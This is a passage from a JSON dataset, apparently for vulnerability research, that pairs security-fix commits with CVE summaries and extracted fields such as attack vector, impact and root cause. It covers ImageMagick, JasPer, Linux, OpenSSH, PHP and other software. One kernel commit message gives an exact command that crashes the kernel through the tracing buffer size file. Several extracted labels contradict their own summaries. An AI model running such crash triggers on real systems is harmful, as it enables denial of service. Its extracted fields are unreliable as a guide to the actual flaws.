attacker"},{"commit_id":"f8877abac8e568b2f339cca70c2c3c1b6eaec288","cve_id":"CVE-2016-10064","cwe_id":"CWE-119","commit_message":"Improve buffer flow sanity check","summary":"Buffer overflow in coders\/tiff.c in ImageMagick before 6.9.5-1 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.","commit_message_1":"improve buffer flow sanity check","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by a buffer overflow","Attack Type":"remote attacker"},{"commit_id":"4e914bbe371433f0590cefdf3bd5f3a5710069f9","cve_id":"CVE-2016-10061","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/196","summary":"The ReadGROUP4Image function in coders\/tiff.c in ImageMagick before 7.0.1-10 does not check the return value of the fputc function, which allows remote attackers to cause a denial of service (crash) via a crafted image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( crash )","Root Cause":"does not check the return value of the fputc function","Attack Type":"remote attacker"},{"commit_id":"933e96f01a8c889c7bf5ffd30020e86a02a046e7","cve_id":"CVE-2016-10060","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/196","summary":"The ConcatenateImages function in MagickWand\/magick-cli.c in ImageMagick before 7.0.1-10 does not check the return value of the fputc function, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash","Root Cause":"does not check the return value of the fputc function","Attack Type":"remote attacker"},{"commit_id":"4ec444f4eab88cf4bec664fafcf9cab50bc5ff6a","cve_id":"CVE-2016-10058","cwe_id":"CWE-400","commit_message":"Fixed memory leak.","summary":"Memory leak in the ReadPSDLayers function in coders\/psd.c in ImageMagick before 6.9.6-3 allows remote attackers to cause a denial of service (memory consumption) via a crafted image file.","commit_message_1":"fixed memory leak","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via a crafted image file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak error","Attack Type":"remote attacker"},{"commit_id":"10b3823a7619ed22d42764733eb052c4159bc8c1","cve_id":"CVE-2016-10057","cwe_id":"CWE-119","commit_message":"Prevent buffer overflow in SIXEL, PDB, MAP, and CALS coders (bug report from Donghai Zhu)","summary":"Buffer overflow in the WriteGROUP4Image function in coders\/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.","commit_message_1":"prevent buffer overflow in sixel , pdb , map , and cals coder ( bug report from donghai zhu )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by a buffer overflow error","Attack Type":"remote attacker"},{"commit_id":"f983dcdf9c178e0cbc49608a78713c5669aa1bb5","cve_id":"CVE-2016-10053","cwe_id":"CWE-369","commit_message":"Fix TIFF divide by zero (bug report from Donghai Zhu)","summary":"The WriteTIFFImage function in coders\/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted file.","commit_message_1":"fix tiff divide by zero ( bug report from donghai zhu )","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted file .","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"9e187b73a8a1290bb0e1a1c878f8be1917aa8742","cve_id":"CVE-2016-10052","cwe_id":"CWE-119","commit_message":"Changed the JPEG writer to raise a warning when the exif profile exceeds 65533 bytes and truncate it.","summary":"Buffer overflow in the WriteProfile function in coders\/jpeg.c in ImageMagick before 6.9.5-6 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.","commit_message_1":"changed the jpeg writer to raise a warning when the exif profile exceeds <number> byte and truncate it","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by an out-of-bounds write error","Attack Type":"remote attacker"},{"commit_id":"ecc03a2518c2b7dd375fde3a040fdae0bdf6a521","cve_id":"CVE-2016-10051","cwe_id":"CWE-416","commit_message":"Prevent memory use after free","summary":"Use-after-free vulnerability in the ReadPWPImage function in coders\/pwp.c in ImageMagick 6.9.5-5 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.","commit_message_1":"prevent memory use after free","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by an use-after-free error","Attack Type":"remote attacker"},{"commit_id":"73fb0aac5b958521e1511e179ecc0ad49f70ebaf","cve_id":"CVE-2016-10050","cwe_id":"CWE-119","commit_message":"RLE check for pixel offset less than 0 (heap overflow report from Craig Young).","summary":"Heap-based buffer overflow in the ReadRLEImage function in coders\/rle.c in ImageMagick 6.9.4-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted RLE file.","commit_message_1":"rle check for pixel offset le than <number> ( heap overflow report from craig young )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted rle file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by a buffer overflow error","Attack Type":"remote attacker"},{"commit_id":"3e9165285eda6e1bb71172031d3048b51bb443a4","cve_id":"CVE-2016-10049","cwe_id":"CWE-119","commit_message":"https:\/\/www.imagemagick.org\/discourse-server\/viewtopic.php?f=3&t=29710","summary":"Buffer overflow in the ReadRLEImage function in coders\/rle.c in ImageMagick before 6.9.4-4 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted RLE file.","commit_message_1":"http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted rle file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by a buffer overflow error","Attack Type":"remote attacker"},{"commit_id":"fc6080f1321fd21e86ef916195cc110b05d9effb","cve_id":"CVE-2016-10048","cwe_id":"CWE-22","commit_message":"Coder path traversal is not authorized, bug report provided by Masaaki Chida","summary":"Directory traversal vulnerability in magick\/module.c in ImageMagick 6.9.4-7 allows remote attackers to load arbitrary modules via unspecified vectors.","commit_message_1":"coder path traversal is not authorized , bug report provided by masaaki chida","Vulnerability Type":"Path Traversal","Attack Vector":"via unspecified vectors","Impact":"load arbitrary modules","Root Cause":"caused by improper validation of path","Attack Type":"remote attacker"},{"commit_id":"989f9f88ea6db09b99d25586e912c921c0da8d3f","cve_id":"CVE-2016-10046","cwe_id":"CWE-119","commit_message":"Prevent buffer overflow (bug report from Max Thrane)","summary":"Heap-based buffer overflow in the DrawImage function in magick\/draw.c in ImageMagick before 6.9.5-5 allows remote attackers to cause a denial of service (application crash) via a crafted image file.","commit_message_1":"prevent buffer overflow ( bug report from max thrane )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by a buffer overflow error","Attack Type":"remote attacker"},{"commit_id":"22f6b4d34fcf039c63a94e7670e0da24f8575a5a","cve_id":"CVE-2016-10044","cwe_id":"CWE-264","commit_message":"aio: mark AIO pseudo-fs noexec\n\nThis ensures that do_mmap() won't implicitly make AIO memory mappings\nexecutable if the READ_IMPLIES_EXEC personality flag is set.  Such\nbehavior is problematic because the security_mmap_file LSM hook doesn't\ncatch this case, potentially permitting an attacker to bypass a W^X\npolicy enforced by SELinux.\n\nI have tested the patch on my machine.\n\nTo test the behavior, compile and run this:\n\n    #define _GNU_SOURCE\n    #include <unistd.h>\n    #include <sys\/personality.h>\n    #include <linux\/aio_abi.h>\n    #include <err.h>\n    #include <stdlib.h>\n    #include <stdio.h>\n    #include <sys\/syscall.h>\n\n    int main(void) {\n        personality(READ_IMPLIES_EXEC);\n        aio_context_t ctx = 0;\n        if (syscall(__NR_io_setup, 1, &ctx))\n            err(1, \"io_setup\");\n\n        char cmd[1000];\n        sprintf(cmd, \"cat \/proc\/%d\/maps | grep -F '\/[aio]'\",\n            (int)getpid());\n        system(cmd);\n        return 0;\n    }\n\nIn the output, \"rw-s\" is good, \"rwxs\" is bad.\n\nSigned-off-by: Jann Horn <jann@thejh.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The aio_mount function in fs\/aio.c in the Linux kernel before 4.7.7 does not properly restrict execute access, which makes it easier for local users to bypass intended SELinux W^X policy restrictions, and consequently gain privileges, via an io_setup system call.","commit_message_1":"mark aio pseudo-fs noexec this ensures that do_mmap ( ) wo n't implicitly make aio memory mapping executable if the read_implies_exec personality flag is set","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via an io _ setup system call","Impact":"bypass intended selinux w ^ x policy restrictions , and consequently gain privileges","Root Cause":"does not properly restrict execute access","Attack Type":"local attacker"},{"commit_id":"92362a92fffe60187df61f99ab11c249d44120ee","cve_id":"CVE-2016-10030","cwe_id":"CWE-284","commit_message":"Fix security issue in _prolog_error().\n\nFix security issue caused by insecure file path handling triggered by\nthe failure of a Prolog script. To exploit this a user needs to\nanticipate or cause the Prolog to fail for their job.\n\n(This commit is slightly different from the fix to the 15.08 branch.)\n\nCVE-2016-10030.","summary":"The _prolog_error function in slurmd\/req.c in Slurm before 15.08.13, 16.x before 16.05.7, and 17.x before 17.02.0-pre4 has a vulnerability in how the slurmd daemon informs users of a Prolog failure on a compute node. That vulnerability could allow a user to assume control of an arbitrary file on the system. Any exploitation of this is dependent on the user being able to cause or anticipate the failure (non-zero return code) of a Prolog script that their job would run on. This issue affects all Slurm versions from 0.6.0 (September 2005) to present. Workarounds to prevent exploitation of this are to either disable your Prolog script, or modify it such that it always returns 0 (*success*) and adjust it to set the node as down using scontrol instead of relying on the slurmd to handle that automatically. If you do not have a Prolog set you are unaffected by this issue.","commit_message_1":"fix security issue in _prolog_error ( )","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted file","Impact":"assume control of an arbitrary file on the system","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"3095060f479b86288e31c79ecbc5131a66bcd2f9","cve_id":"CVE-2016-10012","cwe_id":"CWE-119","commit_message":"Remove support for pre-authentication compression. Doing compression\nearly in the protocol probably seemed reasonable in the 1990s, but\ntoday it's clearly a bad idea in terms of both cryptography (cf.\nmultiple compression oracle attacks in TLS) and attack surface.\n\nMoreover, to support it across privilege-separation zlib needed\nthe assistance of a complex shared-memory manager that made the\nrequired attack surface considerably larger.\n\nPrompted by Guido Vranken pointing out a compiler-elided security\ncheck in the shared memory manager found by Stack\n(http:\/\/css.csail.mit.edu\/stack\/); ok deraadt@ markus@\n\nNB. pre-auth authentication has been disabled by default in sshd\nfor >10 years.","summary":"The shared memory manager (associated with pre-authentication compression) in sshd in OpenSSH before 7.4 does not ensure that a bounds check is enforced by all compilers, which might allows local users to gain privileges by leveraging access to a sandboxed privilege-separation process, related to the m_zback and m_zlib data structures.","commit_message_1":"remove support for pre-authentication compression","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging access to a sandboxed privilege - separation process , related to the m _ zback and m _ zlib data structures","Impact":"gain privileges","Root Cause":"does not ensure that a bounds check is enforced by all compilers","Attack Type":"local attacker"},{"commit_id":"ac8147a06ed2e2403fb6b9a0c03e618a9333c0e9","cve_id":"CVE-2016-10011","cwe_id":"CWE-320","commit_message":"use sshbuf_allocate() to pre-allocate the buffer used for loading\nkeys. This avoids implicit realloc inside the buffer code, which\nmight theoretically leave fragments of the key on the heap. This\ndoesn't appear to happen in practice for normal sized keys, but\nwas observed for novelty oversize ones.\n\nPointed out by Jann Horn of Project Zero; ok markus@","summary":"authfile.c in sshd in OpenSSH before 7.4 does not properly consider the effects of realloc on buffer contents, which might allow local users to obtain sensitive private-key information by leveraging access to a privilege-separated child process.","commit_message_1":"use sshbuf_allocate ( ) to pre-allocate the buffer used for loading key","Vulnerability Type":"Key Management Errors","Attack Vector":"by leveraging access to a privilege - separated child process .","Impact":"obtain sensitive private - key information","Root Cause":"does not properly consider the effects of realloc on buffer contents","Attack Type":"local attacker"},{"commit_id":"c76fac666ea038753294f2ac94d310f8adece9ce","cve_id":"CVE-2016-10010","cwe_id":"CWE-264","commit_message":"disable Unix-domain socket forwarding when privsep is disabled","summary":"sshd in OpenSSH before 7.4, when privilege separation is not used, creates forwarded Unix-domain sockets as root, which might allow local users to gain privileges via unspecified vectors, related to serverloop.c.","commit_message_1":"disable unix-domain socket forwarding when privsep is disabled","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors , related to serverloop . c","Impact":"gain privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"9476ce1dd37d3c3218d5640b74c34c65e5f4efe5","cve_id":"CVE-2016-10009","cwe_id":"CWE-426","commit_message":"add a whitelist of paths from which ssh-agent will load (via\nssh-pkcs11-helper) a PKCS#11 module; ok markus@","summary":"Untrusted search path vulnerability in ssh-agent.c in ssh-agent in OpenSSH before 7.4 allows remote attackers to execute arbitrary local PKCS#11 modules by leveraging control over a forwarded agent-socket.","commit_message_1":"add a whitelist of path from which ssh-agent will load ( via","Vulnerability Type":"untrusted search path","Attack Vector":"modules by leveraging control over a forwarded agent - socket","Impact":"execute arbitrary code","Root Cause":"caused by the loading of a specially crafted PKCS#11 module across a forwarded agent channel","Attack Type":"remote attacker"},{"commit_id":"66fd44209d5ffcb9b3d1bc1b9fd8e35b485040c0","cve_id":"CVE-2016-9935","cwe_id":"CWE-125","commit_message":"Fix bug #73631 - Invalid read when wddx decodes empty boolean element","summary":"The php_wddx_push_element function in ext\/wddx\/wddx.c in PHP before 5.6.29 and 7.x before 7.0.14 allows remote attackers to cause a denial of service (out-of-bounds read and memory corruption) or possibly have unspecified other impact via an empty boolean element in a wddxPacket XML document.","commit_message_1":"fix bug # <number> - invalid read when wddx decodes empty boolean element","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an empty boolean element in a wddxpacket xml document","Impact":"cause a denial of service ( out - of - bounds read and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read and memory error","Attack Type":"remote attacker"},{"commit_id":"6045de69c7dedcba3eadf7c4bba424b19c81d00d","cve_id":"CVE-2016-9934","cwe_id":"CWE-476","commit_message":"Fix bug #73331 - do not try to serialize\/unserialize objects wddx can not handle\n\nProper soltion would be to call serialize\/unserialize and deal with the result,\nbut this requires more work that should be done by wddx maintainer (not me).","summary":"ext\/wddx\/wddx.c in PHP before 5.6.28 and 7.x before 7.0.13 allows remote attackers to cause a denial of service (NULL pointer dereference) via crafted serialized data in a wddxPacket XML document, as demonstrated by a PDORow string.","commit_message_1":"fix bug # <number> - do not try to serialize\/unserialize object wddx can not handle proper soltion would be to call serialize\/unserialize and deal with the result , but this requires more work that should be done by wddx maintainer ( not me )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via crafted serialized data in a wddxpacket xml document , as demonstrated by a pdorow string","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"863d37ea66d5c960db08d6f4a2cbd2518f0f80d1","cve_id":"CVE-2016-9933","cwe_id":"CWE-119","commit_message":"Fix #72696: imagefilltoborder stackoverflow on truecolor images\n\nWe must not allow negative color values be passed to\ngdImageFillToBorder(), because that can lead to infinite recursion\nsince the recursion termination condition will not necessarily be met.","summary":"Stack consumption vulnerability in the gdImageFillToBorder function in gd.c in the GD Graphics Library (aka libgd) before 2.2.2, as used in PHP before 5.6.28 and 7.x before 7.0.13, allows remote attackers to cause a denial of service (segmentation violation) via a crafted imagefilltoborder call that triggers use of a negative color value.","commit_message_1":"imagefilltoborder stackoverflow on truecolor image we must not allow negative color value be passed to gdimagefilltoborder ( ) , because that can lead to infinite recursion since the recursion termination condition will not necessarily be met","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted imagefilltoborder call that triggers use of a negative color value","Impact":"cause a denial of service ( segmentation violation )","Root Cause":"caused by a stack consumption vulnerability","Attack Type":"remote attacker"},{"commit_id":"59643d1535eb220668692a5359de22545af579f6","cve_id":"CVE-2016-9754","cwe_id":"CWE-190","commit_message":"ring-buffer: Prevent overflow of size in ring_buffer_resize()\n\nIf the size passed to ring_buffer_resize() is greater than MAX_LONG - BUF_PAGE_SIZE\nthen the DIV_ROUND_UP() will return zero.\n\nHere's the details:\n\n  # echo 18014398509481980 > \/sys\/kernel\/debug\/tracing\/buffer_size_kb\n\ntracing_entries_write() processes this and converts kb to bytes.\n\n 18014398509481980 << 10 = 18446744073709547520\n\nand this is passed to ring_buffer_resize() as unsigned long size.\n\n size = DIV_ROUND_UP(size, BUF_PAGE_SIZE);\n\nWhere DIV_ROUND_UP(a, b) is (a + b - 1)\/b\n\nBUF_PAGE_SIZE is 4080 and here\n\n 18446744073709547520 + 4080 - 1 = 18446744073709551599\n\nwhere 18446744073709551599 is still smaller than 2^64\n\n 2^64 - 18446744073709551599 = 17\n\nBut now 18446744073709551599 \/ 4080 = 4521260802379792\n\nand size = size * 4080 = 18446744073709551360\n\nThis is checked to make sure its still greater than 2 * 4080,\nwhich it is.\n\nThen we convert to the number of buffer pages needed.\n\n nr_page = DIV_ROUND_UP(size, BUF_PAGE_SIZE)\n\nbut this time size is 18446744073709551360 and\n\n 2^64 - (18446744073709551360 + 4080 - 1) = -3823\n\nThus it overflows and the resulting number is less than 4080, which makes\n\n  3823 \/ 4080 = 0\n\nan nr_pages is set to this. As we already checked against the minimum that\nnr_pages may be, this causes the logic to fail as well, and we crash the\nkernel.\n\nThere's no reason to have the two DIV_ROUND_UP() (that's just result of\nhistorical code changes), clean up the code and fix this bug.\n\nCc: stable@vger.kernel.org # 3.5+\nFixes: 83f40318dab00 (\"ring-buffer: Make removal of ring buffer pages atomic\")\nSigned-off-by: Steven Rostedt <rostedt@goodmis.org>","summary":"The ring_buffer_resize function in kernel\/trace\/ring_buffer.c in the profiling subsystem in the Linux kernel before 4.6.1 mishandles certain integer calculations, which allows local users to gain privileges by writing to the \/sys\/kernel\/debug\/tracing\/buffer_size_kb file.","commit_message_1":"prevent overflow of size in ring_buffer_resize ( ) if the size passed to ring_buffer_resize ( ) is greater than max_long - buf_page_size then the div_round_up ( ) will return zero","Vulnerability Type":"integer overflow","Attack Vector":"by writing to the \/ sys \/ kernel \/ debug \/ tracing \/ buffer _ size _ kb file","Impact":"gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"b61d35eaccc0a7ddeff8a1c3abfcd0a43ccf210b","cve_id":"CVE-2016-9559","cwe_id":"CWE-476","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/298","summary":"coders\/tiff.c in ImageMagick before 7.0.3.7 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via a crafted image.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted image","Impact":"cause a denial of service ( pointer dereference and crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"d42b2388f7f8e0332c846675133acea151fc557a","cve_id":"CVE-2016-9557","cwe_id":"CWE-190","commit_message":"The generation of the configuration file jas_config.h has been completely\nreworked in order to avoid pollution of the global namespace.\n\nSome problematic types like uchar, ulong, and friends have been replaced\nwith names with a jas_ prefix.\n\nAn option max_samples has been added to the BMP and JPEG decoders to\nrestrict the maximum size of image that they can decode.  This change\nwas made as a (possibly temporary) fix to address security concerns.\nA max_samples command-line option has also been added to imginfo.\n\nWhether an image component (for jas_image_t) is stored in memory or on\ndisk is now based on the component size (rather than the image size).\n\nSome debug log message were added.\n\nSome new integer overflow checks were added.\n\nSome new safe integer add\/multiply functions were added.\n\nMore pre-C99 cruft was removed.  JasPer has numerous \"hacks\" to\nhandle pre-C99 compilers.  JasPer now assumes C99 support.  So, this\npre-C99 cruft is unnecessary and can be removed.\n\nThe regression jasper-doublefree-mem_close.jpg has been re-enabled.\nTheoretically, it should work more predictably now.","summary":"Integer overflow in jas_image.c in JasPer before 1.900.25 allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"the generation of the configuration file <file> ha been completely reworked in order to avoid pollution of the global namespace","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"ce98a7acbcfca7f0a178f4b1e7b957e419e0cc99","cve_id":"CVE-2016-9556","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/301","summary":"The IsPixelGray function in MagickCore\/pixel-accessor.h in ImageMagick 7.0.3-8 allows remote attackers to cause a denial of service (out-of-bounds heap read) via a crafted image file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( out - of - bounds heap read )","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"33509cc81ec5f2ba44eb6fd98bd5c1b5873e46bd","cve_id":"CVE-2016-9436","cwe_id":"CWE-20","commit_message":"Fix uninitialised values for <i> and <dd>\n\nBug-Debian: https:\/\/github.com\/tats\/w3m\/issues\/16","summary":"parsetagx.c in w3m before 0.5.3+git20161009 does not properly initialize values, which allows remote attackers to crash the application via a crafted html file, related to a <i> tag.","commit_message_1":"fix uninitialised value for < i > and < dd >","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html file , related to a < i > tag","Impact":"crash the application","Root Cause":"does not properly initialize values","Attack Type":"remote attacker"},{"commit_id":"ff254722a2683867fcb3e67569ffd36226c4bc62","cve_id":"CVE-2016-9400","cwe_id":"CWE-119","commit_message":"added some checks to snap handling","summary":"The CClient::ProcessServerPacket method in engine\/client\/client.cpp in Teeworlds before 0.6.4 allows remote servers to write to arbitrary physical memory locations and possibly execute arbitrary code via vectors involving snap handling.","commit_message_1":"added some check to snap handling","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving snap handling","Impact":"write to arbitrary physical memory locations and possibly execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"f7038068550fba0e41e1d0c355787f1dcd5bf330","cve_id":"CVE-2016-9394","cwe_id":"CWE-20","commit_message":"Added some missing sanity checks on the data in a SIZ marker segment.","summary":"The jas_seq2d_create function in jas_seq.c in JasPer before 1.900.17 allows remote attackers to cause a denial of service (assertion failure) via a crafted file.","commit_message_1":"added some missing sanity check on the data in a siz marker segment","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( assertion failure )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1e84674d95353c64e5c4c0e7232ae86fd6ea813b","cve_id":"CVE-2016-9391","cwe_id":null,"commit_message":"Changed the JPC bitstream code to more gracefully handle a request\nfor a larger sized integer than what can be handled (i.e., return\nwith an error instead of failing an assert).","summary":"The jpc_bitstream_getbits function in jpc_bs.c in JasPer before 2.0.10 allows remote attackers to cause a denial of service (assertion failure) via a very large integer.","commit_message_1":"changed the jpc bitstream code to more gracefully handle a request for a larger sized integer than what can be handled ( <file>","Vulnerability Type":"assertion failure","Attack Vector":"via a very large integer","Impact":"cause a denial of service ( assertion failure )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ba2b9d000660313af7b692542afbd374c5685865","cve_id":"CVE-2016-9390","cwe_id":"CWE-20","commit_message":"Ensure that not all tiles lie outside the image area.","summary":"The jas_seq2d_create function in jas_seq.c in JasPer before 1.900.14 allows remote attackers to cause a denial of service (assertion failure) via a crafted image file.","commit_message_1":"ensure that not all tile lie outside the image area","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( assertion failure )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"dee11ec440d7908d1daf69f40a3324b27cf213ba","cve_id":"CVE-2016-9389","cwe_id":null,"commit_message":"The component domains must be the same for the ICT\/RCT in the JPC codec.\nThis was previously enforced with an assertion.\nNow, it is handled in a more graceful manner.","summary":"The jpc_irct and jpc_iict functions in jpc_mct.c in JasPer before 1.900.14 allow remote attackers to cause a denial of service (assertion failure).","commit_message_1":"the component domain must be the same for the ict\/rct in the jpc codec","Vulnerability Type":"assertion failure","Attack Vector":"via a very large integer","Impact":"cause a denial of service ( assertion failure )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"411a4068f8c464e883358bf403a3e25158863823","cve_id":"CVE-2016-9388","cwe_id":null,"commit_message":"Fixed a few bugs in the RAS encoder and decoder where errors were tested\nwith assertions instead of being gracefully handled.","summary":"The ras_getcmap function in ras_dec.c in JasPer before 1.900.14 allows remote attackers to cause a denial of service (assertion failure) via a crafted image file.","commit_message_1":"fixed a few bug in the ra encoder and decoder where error were tested with assertion instead of being gracefully handled","Vulnerability Type":"assertion failure","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( assertion failure )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d91198abd00fc435a397fe6bad906a4c1748e9cf","cve_id":"CVE-2016-9387","cwe_id":"CWE-190","commit_message":"Fixed another integer overflow problem.","summary":"Integer overflow in the jpc_dec_process_siz function in libjasper\/jpc\/jpc_dec.c in JasPer before 1.900.13 allows remote attackers to have unspecified impact via a crafted file, which triggers an assertion failure.","commit_message_1":"fixed another integer overflow problem","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted file , which triggers an assertion failure","Impact":"have unspecified impact","Root Cause":"caused by an integer overflow error","Attack Type":"remote attacker"},{"commit_id":"1846f48e5fcdde996e7c27a4bbac5d0aef183e4b","cve_id":"CVE-2016-9317","cwe_id":"CWE-20","commit_message":"Fix #340: System frozen\n\ngdImageCreate() doesn't check for oversized images and as such is prone\nto DoS vulnerabilities. We fix that by applying the same overflow check\nthat is already in place for gdImageCreateTrueColor().\n\nCVE-2016-9317","summary":"The gdImageCreate function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (system hang) via an oversized image.","commit_message_1":"system frozen gdimagecreate ( ) doe n't check for oversized image and a such is prone to do vulnerability","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an oversized image","Impact":"cause a denial of service ( system hang )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"3cbfb163cff9e5b8cdeace8312e9bfee810ed02b","cve_id":"CVE-2016-9298","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/296","summary":"Heap overflow in the WaveletDenoiseImage function in MagickCore\/fx.c in ImageMagick before 6.9.6-4 and 7.x before 7.0.3-6 allows remote attackers to cause a denial of service (crash) via a crafted image.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted image","Impact":"cause a denial of service ( crash )","Root Cause":"caused by heap overflow inWaveletDenoiseImage function","Attack Type":"remote attacker"},{"commit_id":"634ce8e8a5accc0fa05dd2c20d42b4749d4b2735","cve_id":"CVE-2016-9262","cwe_id":"CWE-190","commit_message":"Made some changes to the I\/O stream library for memory streams.\nThere were a number of potential problems due to the possibility\nof integer overflow.\nChanged some integral types to the larger types size_t or ssize_t.\nFor example, the function mem_resize now takes the buffer size parameter\nas a size_t.\nAdded a new function jas_stream_memopen2, which takes a\nbuffer size specified as a size_t instead of an int.\nThis can be used in jas_image_cmpt_create to avoid potential\noverflow problems.\n\nAdded a new function jas_deprecated to warn about reliance on\ndeprecated library behavior.","summary":"Multiple integer overflows in the (1) jas_realloc function in base\/jas_malloc.c and (2) mem_resize function in base\/jas_stream.c in JasPer before 1.900.22 allow remote attackers to cause a denial of service via a crafted image, which triggers use after free vulnerabilities.","commit_message_1":"made some change to the i\/o stream library for memory stream","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image , which triggers use after free vulnerabilities","Impact":"cause a denial of service","Root Cause":"caused by multiple integer overflows","Attack Type":"remote attacker"},{"commit_id":"987ad747db6d0d7e36f840398f3cf02e2fbfd90f","cve_id":"CVE-2016-9132","cwe_id":"CWE-190","commit_message":"Fix BER decoder integer overflow","summary":"In Botan 1.8.0 through 1.11.33, when decoding BER data an integer overflow could occur, which would cause an incorrect length field to be computed. Some API callers may use the returned (incorrect and attacker controlled) length field in a way which later causes memory corruption or other failure.","commit_message_1":"fix ber decoder integer overflow","Vulnerability Type":"integer overflow","Attack Vector":"By using a specially-crafted data","Impact":"execute arbitrary code","Root Cause":"caused by an integer overflow when decoding data BER data","Attack Type":"remote attacker"},{"commit_id":"e24bdc716c3327b067c551bc6cfb97fd2370358d","cve_id":"CVE-2016-8887","cwe_id":"CWE-476","commit_message":"Fixed a bug that resulted in the destruction of JP2 box data that had never\nbeen constructed in the first place.","summary":"The jp2_colr_destroy function in libjasper\/jp2\/jp2_cod.c in JasPer before 1.900.10 allows remote attackers to cause a denial of service (NULL pointer dereference).","commit_message_1":"fixed a bug that resulted in the destruction of jp2 box data that had never been constructed in the first place","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"5d66894d2313e3f3469f19066e149e08ff076698","cve_id":"CVE-2016-8884","cwe_id":"CWE-476","commit_message":"Fixed a problem with a null pointer dereference in the BMP decoder.","summary":"The bmp_getdata function in 